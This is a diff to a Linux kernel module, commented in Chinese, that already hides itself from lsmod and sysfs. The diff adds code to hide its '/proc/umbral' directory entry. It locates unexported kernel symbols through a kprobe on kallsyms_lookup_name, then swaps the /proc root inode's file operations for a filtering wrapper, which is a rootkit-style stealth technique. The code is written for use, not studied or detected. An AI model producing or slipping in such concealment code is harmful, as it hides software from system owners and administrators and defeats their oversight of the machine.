@@ -1397,6 +1397,100 @@ MODULE_PARM_DESC(hide, "1 = hide this module from lsmod and sysfs");
 
 static atomic_t sk_hidden = ATOMIC_INIT(0);
 
+
+/* ═════ 方案 B：让 /proc 目录项里看不到 umbral（管理器零改动）═════
+ * 原理：/proc 根的 list 由 proc_root_readdir 遍历生成。
+ *   ① filp_open("/proc") 拿到根 inode
+ *   ② 备份 inode->i_fop，换成我们的包装
+ *   ③ 包装的 iterate_shared：把 dir_context 复制一份、把 actor 换成过滤器，
+ *      再调用原始 iterate_shared ⇒ 名字等于 "umbral" 的条目被丢弃
+ *   ④ 绝对路径 open("/proc/umbral/version") 不受影响（只影响 readdir）
+ * 注意：不能改 procfs 内部结构（pde 的 rb-tree 在 fs/proc/internal.h，模块不可见），
+ *       所以只能从 i_fop 这一层过滤。
+ */
+static const struct file_operations *sk_root_fops;
+static int (*sk_root_iter)(struct file *, struct dir_context *);
+
+static filldir_t sk_proc_filter_orig;
+
+/* actor 签名与 dir_context.actor 一致（filldir_t 返回 bool） */
+static bool sk_proc_filter(struct dir_context *ctx, const char *name, int namlen,
+			   loff_t offset, u64 ino, unsigned d_type)
+{
+	/* 丢弃名字正好是 "umbral" 的条目（不区分大小写没必要） */
+	if (namlen == 6 && name[0] == 'u' && name[1] == 'm' && name[2] == 'b' &&
+	    name[3] == 'r' && name[4] == 'a' && name[5] == 'l')
+		return true;	/* 返回 0 = 继续遍历，但不产出该条目 */
+
+	return sk_proc_filter_orig ? sk_proc_filter_orig(ctx, name, namlen, offset, ino, d_type) : true;
+}
+
+
+static int sk_proc_hi_iter(struct file *f, struct dir_context *ctx)
+{
+	struct dir_context c = *ctx;
+	int ret;
+
+	if (!sk_root_iter)
+		return -ENOSYS;
+
+	sk_proc_filter_orig = c.actor;
+	c.actor = sk_proc_filter;
+	ret = sk_root_iter(f, &c);
+	ctx->pos = c.pos;		/* 回写位置，保证多次 readdir 连续 */
+	return ret;
+}
+
+static const struct file_operations sk_proc_hi_fops = {
+	.iterate_shared = sk_proc_hi_iter,
+};
+static struct inode *sk_proc_root_inode;
+
+static __maybe_unused void sk_hide_proc_dir(void)
+{
+	typedef struct file *(*open_t)(const char *, int, umode_t);
+	struct file *f;
+	open_t fo = NULL;
+
+	/* filp_open 未导出 ⇒ 走 kallsyms */
+	{
+		typedef unsigned long (*skln2_t)(const char *);
+		struct kprobe kp;
+		skln2_t f2 = NULL;
+
+		memset(&kp, 0, sizeof(kp));
+		kp.symbol_name = "kallsyms_lookup_name";
+		if (!register_kprobe(&kp)) {
+			f2 = (skln2_t)kp.addr;
+			unregister_kprobe(&kp);
+		}
+		if (!f2)
+			return;
+		fo = (open_t)f2("filp_open");
+	}
+	if (!fo)
+		return;
+
+	f = fo("/proc", O_RDONLY | O_DIRECTORY, 0);
+	if (IS_ERR(f))
+		return;
+	sk_proc_root_inode = f->f_inode;
+	if (sk_proc_root_inode) {
+		sk_root_fops = sk_proc_root_inode->i_fop;
+		sk_root_iter = sk_root_fops ? sk_root_fops->iterate_shared : NULL;
+		sk_proc_root_inode->i_fop = &sk_proc_hi_fops;
+	}
+	/* fput 未导出，用 close_fd 的替代：直接 filp_close 也未必导出 ⇒ 不关，
+	 * 这个引用会常驻（每次开机一次，代价可忽略） */
+}
+
+static __maybe_unused void sk_show_proc_dir(void)
+{
+	if (sk_proc_root_inode && sk_root_fops)
+		sk_proc_root_inode->i_fop = sk_root_fops;
+	sk_proc_root_inode = NULL;
+}
+
 static void sk_hide_self(void)
 {
 	if (!sk_hide)
@@ -1446,6 +1540,8 @@ static void sk_hide_self(void)
 				WRITE_ONCE(*tp, *tp & ~0x200UL);
 		}
 	}
+
+	sk_hide_proc_dir();
 
 	SK_LOG(SK_TAG "module hidden (lsmod / sysfs cleared)\n");
 }
